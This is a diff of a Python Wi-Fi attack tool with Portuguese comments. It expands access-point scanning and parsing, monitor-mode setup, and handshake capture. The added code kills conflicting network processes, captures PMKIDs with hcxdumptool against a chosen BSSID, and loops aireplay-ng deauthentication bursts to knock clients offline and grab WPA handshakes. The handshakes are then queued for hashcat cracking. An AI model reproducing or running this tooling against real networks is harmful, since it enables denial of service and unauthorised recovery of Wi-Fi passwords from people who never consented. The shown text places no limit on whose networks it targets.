+                pcap = Path(ap["handshake_path"])
+                self.hashcat_worker.enfileirar(
+                    bssid=bssid, essid=ap.get("essid", ""),
+                    pcapng=pcap, perfil="low", wordlists=[],
+                    contextual=True)
 
     # ─── PRÉ-CHECKS ──────────────────────────────────────────
 
@@ -4082,35 +4513,330 @@ class KamikaseEngine:
 
     # ─── DISCOVERY DE APs ────────────────────────────────────
 
-    async def _descobrir_aps(self) -> bool:
-        self.ui.info("Descobrindo APs visíveis...")
+    @staticmethod
+    def _normalizar_bssid(bssid: Any) -> str:
+        b = str(bssid or "").strip().upper().replace("\\:", ":")
+        pares = re.findall(r"[0-9A-F]{2}", b)
+        if len(pares) >= 6:
+            return ":".join(pares[:6])
+        return b
+
+    @staticmethod
+    def _canal_para_freq(canal: Any) -> Optional[int]:
+        try:
+            ch = int(canal)
+        except Exception:
+            return None
+        if 1 <= ch <= 13:
+            return 2407 + (ch * 5)
+        if ch == 14:
+            return 2484
+        if 32 <= ch <= 177:
+            return 5000 + (ch * 5)
+        return None
+
+    @staticmethod
+    def _freq_para_canal(freq_mhz: Any) -> Any:
+        try:
+            freq = int(float(freq_mhz))
+        except Exception:
+            return "?"
+        if freq == 2484:
+            return 14
+        if 2412 <= freq <= 2472:
+            return int((freq - 2407) / 5)
+        if 5000 <= freq <= 5900:
+            return int((freq - 5000) / 5)
+        if 5955 <= freq <= 7115:
+            return int((freq - 5950) / 5)
+        return "?"
+
+    @staticmethod
+    def _freq_label(freq_mhz: Any, canal: Any = "?") -> Tuple[Any, str, str]:
+        try:
+            freq = int(float(freq_mhz))
+        except Exception:
+            freq = KamikaseEngine._canal_para_freq(canal)
+        if not freq:
+            return "?", "?", "?"
+        if 2400 <= freq < 2500:
+            return freq, "2.4 GHz", "baixa"
+        if 4900 <= freq < 5925:
+            return freq, "5 GHz", "media"
+        if 5925 <= freq <= 7125:
+            return freq, "6 GHz", "alta"
+        return freq, f"{round(freq / 1000, 2)} GHz", "?"
+
+    @staticmethod
+    def _signal_percent_para_dbm(signal: Any) -> Any:
+        try:
+            pct = int(float(signal))
+        except Exception:
+            return "?"
+        return int((pct / 2) - 100)
+
+    @staticmethod
+    def _signal_label(rssi: Any = "?", signal_percent: Any = "?") -> str:
+        try:
+            val = float(rssi)
+        except Exception:
+            try:
+                val = float(KamikaseEngine._signal_percent_para_dbm(signal_percent))
+            except Exception:
+                return "?"
+        if val >= -55:
+            return "alta"
+        if val >= -72:
+            return "media"
+        return "baixa"
+
+    @staticmethod
+    def _escape_nmcli_value(value: str) -> str:
+        return (value or "").replace("\\:", ":").replace("\\\\", "\\").strip()
+
+    def _normalizar_ap(self, ap: Dict[str, Any], source: str = "") -> Optional[Dict[str, Any]]:
+        bssid = self._normalizar_bssid(ap.get("bssid"))
+        if not re.fullmatch(r"(?:[0-9A-F]{2}:){5}[0-9A-F]{2}", bssid):
+            return None
+
+        # Tenta extrair canal/freq de qualquer alias
+        canal_raw = ap.get("canal", ap.get("chan", ap.get("channel", "?")))
+        freq_raw = ap.get("freq_mhz", ap.get("frequency", ap.get("freq", "?")))
+
+        # 1) Tenta normalizar canal pra int
+        canal = "?"
+        try:
+            if str(canal_raw).strip() and str(canal_raw).strip() != "?":
+                canal = int(float(canal_raw))
+        except Exception:
+            pass
+
+        # 2) Tenta normalizar freq pra int
+        freq_mhz = "?"
+        try:
+            if str(freq_raw).strip() and str(freq_raw).strip() != "?":
+                freq_mhz = int(float(freq_raw))
+        except Exception:
+            pass
+
+        # 3) Cross-fill: se temos canal mas não freq, calcula via tabela
+        if canal != "?" and freq_mhz == "?":
+            freq_calc = CHANNEL_TO_FREQ_ALL.get(canal)
+            if freq_calc:
+                freq_mhz = freq_calc
+            else:
+                # Tenta via _canal_para_freq (cobre 6GHz e edge cases)
+                fc = self._canal_para_freq(canal)
+                if fc:
+                    freq_mhz = fc
+
+        # 4) Cross-fill reverso: se temos freq mas não canal
+        if freq_mhz != "?" and canal == "?":
+            canal_calc = FREQ_TO_CHANNEL_ALL.get(freq_mhz)
+            if canal_calc:
+                canal = canal_calc
+            else:
+                cc = self._freq_para_canal(freq_mhz)
+                if cc != "?":
+                    canal = cc
+
+        # 5) Banda — derivada de freq_mhz (sempre confiável quando temos freq)
+        band_label = "?"
+        band_ghz = "?"
+        if freq_mhz != "?":
+            try:
+                fv = int(freq_mhz)
+                if 2400 <= fv < 2500:
+                    band_label, band_ghz = "2.4 GHz", 2.4
+                elif 4900 <= fv < 5925:
+                    band_label, band_ghz = "5 GHz", 5.0
+                elif 5925 <= fv <= 7125:
+                    band_label, band_ghz = "6 GHz", 6.0
+            except Exception:
+                pass
+
+        rssi = ap.get("rssi_dbm", ap.get("rssi", "?"))
+        signal_percent = ap.get("signal_percent", ap.get("signal", "?"))
+        if rssi in (None, "", "?"):
+            rssi = self._signal_percent_para_dbm(signal_percent)
+        security = ap.get("security", ap.get("crypto", "?")) or "OPEN"
+        essid = ap.get("essid", ap.get("ssid", "<oculto>")) or "<oculto>"
+        # Filtro de ESSID inválido — "?" puro não tem valor pro usuário e
+        # poluí a UI. Mantém "<oculto>" porque é informação legítima.
+        essid_strip = str(essid).strip()
+        if essid_strip == "?" or essid_strip == "":
+            return None
+        normalizado = dict(ap)
+        normalizado.update({
+            "essid": str(essid).strip() or "<oculto>",
+            "bssid": bssid,
+            "canal": canal,
+            "freq_mhz": freq_mhz,
+            "band_ghz": band_ghz,
+            "band_label": band_label,
+            "rssi": rssi,
+            "rssi_dbm": rssi,
+            "signal_percent": signal_percent,
+            "signal_label": self._signal_label(rssi, signal_percent),
+            "security": str(security).strip() or "OPEN",
+            "crypto": str(security).strip() or "OPEN",
+            "source": source or ap.get("source", "?"),
+        })
+        return normalizado
+
+    def _mesclar_aps(self, *listas: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Merge inteligente: para cada BSSID, preserva canal/freq de qualquer
+        fonte que conseguiu detectar (não sobrescreve com '?'), pega RSSI mais
+        forte (menos negativo) e security mais detalhada."""
+        por_bssid: Dict[str, Dict[str, Any]] = {}
+        for lista in listas:
+            for ap in lista or []:
+                norm = self._normalizar_ap(ap, ap.get("source", ""))
+                if not norm:
+                    continue
+                bssid = norm["bssid"]
+                atual = por_bssid.get(bssid)
+                if not atual:
+                    por_bssid[bssid] = norm
+                    continue
+
+                # Merge campo-a-campo: prefere valor "real" sobre "?"
+                mesclado = dict(atual)
+                for k, v in norm.items():
+                    val_atual = atual.get(k)
+                    val_atual_invalido = val_atual in (None, "", "?")
+                    val_novo_valido = v not in (None, "", "?")
+                    if val_atual_invalido and val_novo_valido:
+                        mesclado[k] = v
+                    elif k == "rssi" or k == "rssi_dbm":
+                        # Preserva RSSI mais forte (menos negativo) entre os dois
+                        try:
+                            r_atual = float(val_atual) if not val_atual_invalido else -200
+                            r_novo = float(v) if val_novo_valido else -200
+                            if r_novo > r_atual:
+                                mesclado[k] = v
+                        except Exception:
+                            pass
+                    elif k == "security" or k == "crypto":
+                        # Prefere security mais informativa (mais longa)
+                        if val_novo_valido and len(str(v)) > len(str(val_atual or "")):
+                            mesclado[k] = v
+                    elif k == "essid":
+                        # Prefere ESSID não-oculto
+                        if val_novo_valido and v != "<oculto>" and val_atual == "<oculto>":
+                            mesclado[k] = v
+
+                # Source: concat de todas as fontes
+                fontes = set(str(atual.get("source", "")).split("+")) if atual.get("source") else set()
+                fontes.add(str(norm.get("source", "?")))
+                mesclado["source"] = "+".join(sorted(f for f in fontes if f and f != "?")) or "?"
+                por_bssid[bssid] = mesclado
+        return sorted(por_bssid.values(),
+                      key=lambda a: (str(a.get("essid", "")).lower(), a.get("bssid", "")))
+
+    def _adicionar_ou_mesclar_ap(self, novo_ap: Dict[str, Any]) -> Tuple[Dict[str, Any], bool]:
+        """Adiciona AP novo a self.alvos OU mescla com existente (sem duplicar).
+        Retorna (ap_final, eh_novo). Usado pelo scan contínuo + nmcli button."""
+        norm = self._normalizar_ap(novo_ap, novo_ap.get("source", ""))
+        if not norm:
+            return novo_ap, False
+        bssid = norm["bssid"]
+        # Procura existente
+        for i, existente in enumerate(self.alvos):
+            if existente.get("bssid") == bssid:
+                # Mescla preservando dados úteis
+                mesclados = self._mesclar_aps([existente, norm])
+                if mesclados:
+                    self.alvos[i] = mesclados[0]
+                    return self.alvos[i], False
+                return existente, False
+        # Não existe: adiciona
+        self.alvos.append(norm)
+        return norm, True
+
+    def _scan_aps_kali(self, timeout_sec: int = 12, scan_profundo: bool = False) -> List[Dict[str, Any]]:
+        """Coleta APs via nmcli, iw e scapy (se profundo). Retorna LISTA BRUTA
+        sem mesclar — o merge é feito UMA VEZ em _descobrir_aps (B3)."""
+        listas: List[Dict[str, Any]] = []
+        try:
+            nmcli_aps = self._scan_aps_nmcli(timeout_sec=timeout_sec)
+            if nmcli_aps:
+                listas.extend(nmcli_aps)
+            else:
+                self.ui.info("  nmcli nao retornou APs, tentando iw...")
+        except Exception as e:
+            self.ui.warn(f"  nmcli falhou: {e}, tentando iw...")
+        if HAS_IW:
+            try:
+                iw_aps = self._scan_aps_iw(timeout_sec=timeout_sec + (8 if scan_profundo else 4))
+                if iw_aps:
+                    listas.extend(iw_aps)
+            except Exception as e:
+                self.ui.warn(f"  iw scan falhou: {e}")
+        if scan_profundo and HAS_SCAPY:
+            try:
+                scapy_aps = self._scan_aps_scapy(timeout_sec=15)
+                if scapy_aps:
+                    listas.extend(scapy_aps)
+            except Exception as e:
+                self.ui.warn(f"  scapy scan falhou: {e}")
+        return listas
+
+    async def _descobrir_aps(self, scan_profundo: bool = False) -> bool:
+        """Descobre APs visíveis. Acumula resultados de múltiplos métodos e
+        chama _mesclar_aps UMA SÓ VEZ no final (B3 — dedup unificado)."""
+        self.ui.info(f"Descobrindo APs visíveis...{' (modo profundo)' if scan_profundo else ''}")
+        timeout_base = 20 if scan_profundo else 12
+        coletados: List[Dict[str, Any]] = []  # lista bruta, ainda sem dedup
+
+        # Coleta de todos os métodos disponíveis para o motor atual
         try:
             if self.ctx.motor == "adm":
-                self.alvos = self._scan_aps_windows()
+                coletados.extend(self._scan_aps_windows(timeout_sec=timeout_base) or [])
             elif self.ctx.motor == "root-kali":
-                self.alvos = self._scan_aps_iw()
+                coletados.extend(self._scan_aps_kali(timeout_sec=timeout_base,
+                                                      scan_profundo=scan_profundo) or [])
+                # Se nada veio, tenta iw isolado como fallback final
+                if not coletados and HAS_IW:
+                    coletados.extend(self._scan_aps_iw(timeout_sec=timeout_base + 5) or [])
             elif self.ctx.motor == "root-termux":
-                self.alvos = self._scan_aps_termux()
+                coletados.extend(self._scan_aps_termux(timeout_sec=timeout_base) or [])
         except Exception as e:
             self.ui.warn(f"  Scan via método nativo falhou: {e}")
-        if not self.alvos and HAS_SCAPY:
-            self.ui.info("  Caindo para scapy beacon sniff (8s)...")
-            self.alvos = self._scan_aps_scapy()
-        if not self.alvos:
+
+        # Complemento scapy (sempre que possível, para enriquecer)
+        # Antes só rodava se nada foi achado OU scan_profundo. Agora roda
+        # se profundo OU se temos < 3 APs (para tentar achar mais)
+        if HAS_SCAPY and (scan_profundo or len(coletados) < 3):
+            scan_time = 15 if scan_profundo else 10
+            self.ui.info(f"  Scan scapy beacon sniff ({scan_time}s)...")
+            try:
+                scapy_aps = self._scan_aps_scapy(timeout_sec=scan_time)
+                if scapy_aps:
+                    coletados.extend(scapy_aps)
+            except Exception as e:
+                self.ui.warn(f"  scapy fallback falhou: {e}")
+
+        if not coletados:
             return False
+
+        # Dedup + merge ÚNICO no final (mais robusto que dedup parcial)
+        self.alvos = self._mesclar_aps(coletados)
         rows = [[a.get("essid", "?")[:24], a.get("bssid", "?"),
-                 str(a.get("canal", "?")), str(a.get("rssi", "?"))]
+                 str(a.get("canal", "?")), str(a.get("freq_mhz", "?")),
+                 str(a.get("band_label", "?")), str(a.get("rssi_dbm", "?"))]
                 for a in self.alvos[:30]]
         self.ui.table(f"APs Descobertos ({len(self.alvos)})",
                        [("ESSID", C_CYAN), ("BSSID", C_WHITE),
-                        ("Canal", C_YELLOW), ("RSSI dBm", C_GREEN)], rows)
+                        ("Canal", C_YELLOW), ("MHz", C_CYAN),
+                        ("Banda", C_YELLOW), ("RSSI dBm", C_GREEN)], rows)
         return True
 
-    def _scan_aps_windows(self) -> List[Dict[str, Any]]:
+    def _scan_aps_windows(self, timeout_sec: int = 10) -> List[Dict[str, Any]]:
         try:
             saida = subprocess.check_output(
                 ["netsh", "wlan", "show", "networks", "mode=bssid"],
-                text=True, errors="ignore", timeout=10)
+                text=True, errors="ignore", timeout=timeout_sec)
         except Exception:
             return []
         alvos = []
@@ -4136,13 +4862,91 @@ class KamikaseEngine:
                 alvos[-1]["canal"] = int(m.group(1))
         return alvos
 
-    def _scan_aps_iw(self) -> List[Dict[str, Any]]:
+    def _scan_aps_nmcli(self, timeout_sec: int = 12) -> List[Dict[str, Any]]:
+        """Scan via nmcli em formato multiline para evitar parsing fragil de BSSID."""
+        if not shutil.which("nmcli"):
+            return []
+        try:
+            subprocess.run(["nmcli", "device", "wifi", "rescan"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                           timeout=min(8, timeout_sec))
+        except Exception:
+            pass
+        try:
+            saida = subprocess.check_output(
+                ["nmcli", "-m", "multiline", "-f",
+                 "SSID,BSSID,CHAN,FREQ,SIGNAL,SECURITY",
+                 "device", "wifi", "list", "--rescan", "yes"],
+                text=True, errors="ignore", timeout=timeout_sec)
+        except Exception:
+            try:
+                saida = subprocess.check_output(
+                    ["nmcli", "-m", "multiline", "-f",
+                     "SSID,BSSID,CHAN,SIGNAL,SECURITY",
+                     "device", "wifi", "list"],
+                    text=True, errors="ignore", timeout=timeout_sec)
+            except Exception:
+                return []
+        alvos: List[Dict[str, Any]] = []
+        atual: Dict[str, str] = {}
+
+        def flush_atual():
+            if not atual:
+                return
+            bssid = self._normalizar_bssid(atual.get("BSSID"))
+            if not bssid:
+                atual.clear()
+                return
+            signal = atual.get("SIGNAL", "?")
+            freq_raw = atual.get("FREQ", "?")
+            freq_match = re.search(r"\d+", str(freq_raw))
+            freq_mhz = int(freq_match.group(0)) if freq_match else "?"
+            alvos.append({
+                "essid": self._escape_nmcli_value(atual.get("SSID", "")) or "<oculto>",
+                "bssid": bssid,
+                "canal": atual.get("CHAN", "?"),
+                "freq_mhz": freq_mhz,
+                "signal_percent": signal,
+                "rssi": self._signal_percent_para_dbm(signal),
+                "security": self._escape_nmcli_value(atual.get("SECURITY", "")) or "OPEN",
+                "source": "nmcli",
+            })
+            atual.clear()
+
+        for linha in saida.splitlines():
+            if not linha.strip():
+                flush_atual()
+                continue
+            m = re.match(r"\s*([A-Z0-9_-]+):\s*(.*)\s*$", linha)
+            if not m:
+                continue
+            chave, valor = m.group(1), m.group(2)
+            if chave == "SSID" and atual.get("BSSID"):
+                flush_atual()
+            atual[chave] = valor
+        flush_atual()
+        return alvos
+
+    def _scan_aps_iw(self, timeout_sec: int = 15) -> List[Dict[str, Any]]:
         if not HAS_IW:
             return []
         try:
+            # Tenta scan normal primeiro
             saida = subprocess.check_output(
                 ["iw", "dev", self.iface_orig, "scan"],
-                text=True, errors="ignore", timeout=15)
+                text=True, errors="ignore", timeout=timeout_sec)
+        except subprocess.TimeoutExpired:
+            # Se timeout, tenta com su (pode precisar de privilégios)
+            if self.ctx.ativo:
+                try:
+                    cmd = f"iw dev {self.iface_orig} scan"
+                    saida = subprocess.check_output(
+                        ["su", "-c", cmd] if self.ctx.motor == "root-termux" else ["sudo", "iw", "dev", self.iface_orig, "scan"],
+                        text=True, errors="ignore", timeout=timeout_sec + 5)
+                except Exception:
+                    return []
+            else:
+                return []
         except Exception:
             return []
         alvos = []
@@ -4153,7 +4957,8 @@ class KamikaseEngine:
                 if bssid_atual:
                     alvos.append(bssid_atual)
                 bssid_atual = {"bssid": m.group(1).upper(), "essid": "<oculto>",
-                               "canal": "?", "rssi": "?"}
+                               "canal": "?", "rssi": "?", "freq_mhz": "?",
+                               "security": "OPEN", "source": "iw"}
                 continue
             if not bssid_atual:
                 continue
@@ -4163,21 +4968,31 @@ class KamikaseEngine:
             m = re.match(r"\s*signal:\s*(-?\d+\.?\d*)\s*dBm", linha)
             if m:
                 bssid_atual["rssi"] = float(m.group(1))
+                bssid_atual["rssi_dbm"] = float(m.group(1))
+            m = re.match(r"\s*freq:\s*(\d+)", linha)
+            if m:
+                bssid_atual["freq_mhz"] = int(m.group(1))
             m = re.match(r"\s*DS Parameter set: channel\s+(\d+)", linha)
             if m:
                 bssid_atual["canal"] = int(m.group(1))
             m = re.match(r"\s*\* primary channel:\s+(\d+)", linha)
             if m:
                 bssid_atual["canal"] = int(m.group(1))
+            if "WPA:" in linha or "RSN:" in linha:
+                atual_sec = bssid_atual.get("security", "OPEN")
+                if "RSN:" in linha and "WPA2" not in atual_sec:
+                    bssid_atual["security"] = "WPA2" if atual_sec == "OPEN" else f"{atual_sec} WPA2"
+                if "WPA:" in linha and "WPA" not in atual_sec:
+                    bssid_atual["security"] = "WPA" if atual_sec == "OPEN" else f"{atual_sec} WPA"
         if bssid_atual:
             alvos.append(bssid_atual)
         return alvos
 
-    def _scan_aps_termux(self) -> List[Dict[str, Any]]:
+    def _scan_aps_termux(self, timeout_sec: int = 10) -> List[Dict[str, Any]]:
         # Tenta termux-wifi-scaninfo (JSON) primeiro
         try:
             saida = subprocess.check_output(
-                ["termux-wifi-scaninfo"], text=True, errors="ignore", timeout=10)
+                ["termux-wifi-scaninfo"], text=True, errors="ignore", timeout=timeout_sec)
             data = json.loads(saida)
             return [{"essid": d.get("ssid", "<oculto>"),
                      "bssid": d.get("bssid", "?").upper(),
@@ -4187,12 +5002,12 @@ class KamikaseEngine:
         except Exception:
             pass
         # Fallback: su -c "iw dev wlan0 scan"
-        if HAS_SU:
+        if HAS_SU or self.ctx.ativo:
             try:
+                cmd = f"iw dev {self.iface_orig} scan"
                 saida = subprocess.check_output(
-                    ["su", "-c", f"iw dev {self.iface_orig} scan"],
-                    text=True, errors="ignore", timeout=15)
-                # Reusa parser do iw (mesmo formato)
+                    ["su", "-c", cmd],
+                    text=True, errors="ignore", timeout=timeout_sec + 5)
                 return self._parse_iw_scan(saida)
             except Exception:
                 pass
@@ -4206,19 +5021,28 @@ class KamikaseEngine:
             if m:
                 if cur: alvos.append(cur)
                 cur = {"bssid": m.group(1).upper(), "essid": "<oculto>",
-                       "canal": "?", "rssi": "?"}
+                       "canal": "?", "rssi": "?", "freq_mhz": "?",
+                       "security": "OPEN", "source": "iw"}
                 continue
             if not cur: continue
             m = re.match(r"\s*SSID:\s*(.+)", linha)
             if m: cur["essid"] = m.group(1).strip() or "<oculto>"
             m = re.match(r"\s*signal:\s*(-?\d+\.?\d*)", linha)
             if m: cur["rssi"] = float(m.group(1))
+            m = re.match(r"\s*freq:\s*(\d+)", linha)
+            if m: cur["freq_mhz"] = int(m.group(1))
             m = re.match(r"\s*DS Parameter set: channel\s+(\d+)", linha)
             if m: cur["canal"] = int(m.group(1))
+            if "WPA:" in linha or "RSN:" in linha:
+                atual_sec = cur.get("security", "OPEN")
+                if "RSN:" in linha and "WPA2" not in atual_sec:
+                    cur["security"] = "WPA2" if atual_sec == "OPEN" else f"{atual_sec} WPA2"
+                if "WPA:" in linha and "WPA" not in atual_sec:
+                    cur["security"] = "WPA" if atual_sec == "OPEN" else f"{atual_sec} WPA"
         if cur: alvos.append(cur)
         return alvos
 
-    def _scan_aps_scapy(self) -> List[Dict[str, Any]]:
+    def _scan_aps_scapy(self, timeout_sec: int = 8) -> List[Dict[str, Any]]:
         if not HAS_SCAPY:
             return []
         encontrados: Dict[str, Dict[str, Any]] = {}
@@ -4232,41 +5056,86 @@ class KamikaseEngine:
                             essid = p[Dot11Elt].info.decode(errors="ignore") or "<oculto>"
                         except Exception:
                             essid = "<oculto>"
+                        # Extrai canal do DS Parameter Set (ID=3) ou HT Information
+                        canal = "?"
+                        try:
+                            for elt in p[Dot11Beacon].payload:
+                                if hasattr(elt, 'ID') and elt.ID == 3:  # DS Parameter Set
+                                    canal = int(ord(elt.info))
+                                    break
+                                elif hasattr(elt, 'ID') and elt.ID == 61:  # HT Information (fallback)
+                                    if len(elt.info) > 0:
+                                        canal = int(elt.info[0])
+                                        break
+                        except Exception:
+                            pass
+                        # Extrai RSSI se disponível
+                        rssi = "?"
+                        try:
+                            if hasattr(p, 'dBm_AntSignal'):
+                                rssi = int(p.dBm_AntSignal)
+                            elif hasattr(p, 'RSSI'):
+                                rssi = int(p.RSSI)
+                        except Exception:
+                            pass
                         encontrados[bssid] = {
                             "bssid": bssid, "essid": essid,
-                            "canal": "?", "rssi": "?",
+                            "canal": canal, "freq_mhz": self._canal_para_freq(canal) or "?",
+                            "rssi": rssi, "rssi_dbm": rssi,
+                            "security": "?", "source": "scapy",
                         }
             except Exception:
                 pass
 
         try:
-            sniff(iface=self.iface_orig, prn=cb, timeout=8, store=False)
-        except Exception:
-            pass
+            iface = self.iface_monitor if self.iface_monitor else self.iface_orig
+            sniff(iface=iface, prn=cb, timeout=timeout_sec, store=False)
+        except Exception as e:
+            self.ui.warn(f"  Scapy sniff falhou: {e}")
         return list(encontrados.values())
 
     # ─── MONITOR MODE ────────────────────────────────────────
 
     def _setup_monitor(self) -> bool:
+        """Setup monitor mode robusto. No Kali:
+        1) airmon-ng check kill (mata NetworkManager/wpa_supplicant)
+        2) airmon-ng start <iface>
+        3) Detecta nome real via `iw dev` (mais confiável que regex de saída)
+        4) Fallback `iw set type monitor` se airmon-ng falhar"""
         if self.ctx.motor == "adm":
             self.iface_monitor = self.iface_orig  # NPCAP injeta direto
             self.ui.info("Windows: scapy/NPCAP injeta sem mudar para monitor mode.")
             return True
+
         if self.ctx.motor == "root-kali" and HAS_AIRMON:
+            # 1) Mata processos conflitantes (essencial pra estabilidade)
+            try:
+                self.ui.info("airmon-ng check kill — encerrando processos conflitantes...")
+                subprocess.run(["airmon-ng", "check", "kill"],
+                               timeout=12, check=False,
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except Exception:
+                pass
+            # 2) airmon-ng start
             try:
                 saida = subprocess.check_output(
                     ["airmon-ng", "start", self.iface_orig],
-                    text=True, errors="ignore", timeout=10)
-                # Procura nome da iface monitor
-                m = re.search(r"\[?phy\d+\]?(\w+mon|\w+\d+)", saida)
-                if m:
-                    self.iface_monitor = m.group(1)
+                    text=True, errors="ignore", timeout=15)
+                # 3) Descobre nome real via `iw dev` (procura type=monitor)
+                self.iface_monitor = self._descobrir_iface_monitor() or ""
+                if not self.iface_monitor:
+                    # Fallback: parse da saída
+                    m = re.search(r"\[?phy\d+\]?(\w+mon|\w+\d+)", saida)
+                    self.iface_monitor = m.group(1) if m else (self.iface_orig + "mon")
+                # Confirma que existe
+                if not self._iface_existe(self.iface_monitor):
+                    self.ui.warn(f"  airmon-ng disse {self.iface_monitor} mas iface não existe; tentando iw...")
                 else:
-                    self.iface_monitor = self.iface_orig + "mon"
-                self.ui.success(f"Modo monitor ativo em: {self.iface_monitor}")
-                return True
+                    self.ui.success(f"✓ Monitor mode ativo: {self.iface_monitor}")
+                    return True
             except Exception as e:
                 self.ui.warn(f"airmon-ng falhou: {e}; tentando iw...")
+
         # Fallback iw
         if HAS_IW:
             try:
@@ -4281,11 +5150,37 @@ class KamikaseEngine:
                 subprocess.run(cmd_set, timeout=5, check=False)
                 subprocess.run(cmd_up, timeout=5, check=False)
                 self.iface_monitor = self.iface_orig
-                self.ui.success(f"Monitor mode (iw) em: {self.iface_monitor}")
+                self.ui.success(f"✓ Monitor mode (iw) em: {self.iface_monitor}")
                 return True
             except Exception as e:
                 self.ui.error(f"iw set monitor falhou: {e}")
         return False
+
+    @staticmethod
+    def _iface_existe(nome: str) -> bool:
+        try:
+            return os.path.exists(f"/sys/class/net/{nome}")
+        except Exception:
+            return False
+
+    def _descobrir_iface_monitor(self) -> Optional[str]:
+        """Roda `iw dev` e retorna nome da primeira iface em type=monitor."""
+        if not HAS_IW:
+            return None
+        try:
+            saida = subprocess.check_output(["iw", "dev"], text=True,
+                                             errors="ignore", timeout=5)
+            # Parse: blocos por interface, procura "type monitor"
+            atual = None
+            for linha in saida.splitlines():
+                m = re.match(r"\s*Interface\s+(\S+)", linha)
+                if m:
+                    atual = m.group(1)
+                if atual and "type monitor" in linha:
+                    return atual
+        except Exception:
+            return None
+        return None
 
     # ─── ATAQUE ──────────────────────────────────────────────
 
@@ -4574,7 +5469,7 @@ class WifiSecurityAuditor:
 class PMKIDCapture:
     """Captura PMKID via hcxdumptool ou handshake via airodump+aireplay."""
 
-    def __init__(self, ui: "TerminalUI", iface: str, timeout_s: int = 25):
+    def __init__(self, ui: "TerminalUI", iface: str, timeout_s: int = 30):
         self.ui = ui
         self.iface = iface
         self.timeout_s = timeout_s
@@ -4587,32 +5482,43 @@ class PMKIDCapture:
         nome = bssid.replace(":", "")
         out = HANDSHAKE_DIR / f"hs_{nome}_{ts}.pcapng"
 
+        # Tenta PMKID via hcxdumptool primeiro
         if HAS_HCXDUMPTOOL:
             self.ui.info(f"  PMKID: hcxdumptool em {bssid} (até {self.timeout_s}s)")
             try:
+                # Cria arquivo temporário de filtro
+                filter_file = HANDSHAKE_DIR / f"filter_{nome}.txt"
+                filter_file.write_text(bssid + "\n")
+                
                 cmd = ["hcxdumptool", "-i", self.iface,
                        "-w", str(out),
-                       "--filterlist_ap", "-",
-                       "--filtermode=2"]
-                # Modo simples: 25s focado
-                proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
-                                         stderr=subprocess.DEVNULL,
-                                         stdin=subprocess.PIPE)
-                try:
-                    proc.stdin.write(f"{bssid}\n".encode())
-                    proc.stdin.close()
-                except Exception:
-                    pass
+                       "--filterlist_ap", str(filter_file),
+                       "--filtermode=2",
+                       "--enable_status=1"]
+                
+                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                         stderr=subprocess.PIPE,
+                                         text=True)
                 try:
                     proc.wait(timeout=self.timeout_s)
                 except subprocess.TimeoutExpired:
                     proc.terminate()
-                    try: proc.wait(timeout=3)
-                    except Exception: proc.kill()
+                    try: 
+                        proc.wait(timeout=3)
+                    except Exception: 
+                        proc.kill()
+                
+                # Limpa arquivo de filtro
+                if filter_file.exists():
+                    filter_file.unlink()
+                
                 if out.exists() and out.stat().st_size > 100:
+                    self.ui.success(f"  ✓ PMKID capturado: {out.name}")
                     return out
             except Exception as e:
                 self.ui.warn(f"  hcxdumptool falhou: {e}")
+                if 'filter_file' in locals() and filter_file.exists():
+                    filter_file.unlink()
 
         # Fallback: airodump-ng captura + aireplay-ng deauth (clássico)
         if HAS_AIRODUMP and HAS_AIREPLAY:
@@ -4625,24 +5531,174 @@ class PMKIDCapture:
                             self.iface]
                 p_dump = subprocess.Popen(cmd_dump, stdout=subprocess.DEVNULL,
                                            stderr=subprocess.DEVNULL)
+                
+                # Aguarda airodump iniciar
+                time.sleep(3)
+                
                 # Deauth burst para forçar reconexão e capturar handshake
-                time.sleep(2)
-                cmd_deauth = ["aireplay-ng", "-0", "10", "-a", bssid, self.iface]
-                subprocess.run(cmd_deauth, stdout=subprocess.DEVNULL,
-                               stderr=subprocess.DEVNULL, timeout=15)
+                cmd_deauth = ["aireplay-ng", "-0", "20", "-a", bssid, self.iface]
+                try:
+                    subprocess.run(cmd_deauth, stdout=subprocess.DEVNULL,
+                                   stderr=subprocess.DEVNULL, timeout=20)
+                except subprocess.TimeoutExpired:
+                    pass
+                
                 # Aguarda mais tempo pro handshake
-                time.sleep(self.timeout_s - 17 if self.timeout_s > 17 else 8)
+                time.sleep(self.timeout_s - 23 if self.timeout_s > 23 else 10)
+                
                 p_dump.terminate()
-                try: p_dump.wait(timeout=3)
-                except Exception: p_dump.kill()
+                try: 
+                    p_dump.wait(timeout=3)
+                except Exception: 
+                    p_dump.kill()
+                
                 # airodump cria <base>-01.pcapng
                 achados = list(HANDSHAKE_DIR.glob(f"{out.stem.split('_')[0]}*.pcapng"))
                 achados.sort(key=lambda p: p.stat().st_mtime, reverse=True)
                 if achados and achados[0].stat().st_size > 1000:
+                    self.ui.success(f"  ✓ Handshake capturado: {achados[0].name}")
                     return achados[0]
             except Exception as e:
                 self.ui.warn(f"  Fallback handshake falhou: {e}")
+        
+        self.ui.error(f"  ✗ Falha ao capturar handshake/PMKID para {bssid}")
         return None
+
+    def capturar_infinito(self, bssid: str, canal: int = 0,
+                          stop_event: Optional[threading.Event] = None,
+                          on_tentativa=None) -> Optional[Path]:
+        """Captura de handshake — estratégia única, cirúrgica:
+
+          1. Trava o canal da iface monitor no canal do AP (essencial — sem
+             isso o channel hopper pula fora durante a escuta).
+          2. Sobe airodump-ng filtrado por BSSID escutando em background.
+          3. Loop: dispara burst de 30 deauth via aireplay-ng, espera 8s pro
+             cliente reconectar e o 4-way handshake aparecer no .cap, e
+             checa o .cap por EAPOL (>= 2 frames). Repete até pegar.
+          4. Cancelável via stop_event. Nunca propaga exception.
+        """
+        if not (HAS_AIRODUMP and HAS_AIREPLAY):
+            self.ui.error("  ✗ airodump-ng e aireplay-ng são necessários "
+                          "para captura. Instale aircrack-ng suite.")
+            return None
+        nome = bssid.replace(":", "")
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        base = HANDSHAKE_DIR / f"hs_{nome}_{ts}"
+        cap_file = Path(str(base) + "-01.cap")
+
+        # 1) Trava o canal pra airodump não ficar pulando
+        canal_alvo = int(canal) if canal else 1
+        if HAS_IW:
+            try:
+                subprocess.run(["iw", "dev", self.iface, "set", "channel", str(canal_alvo)],
+                               timeout=3, check=False,
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except Exception:
+                pass
+
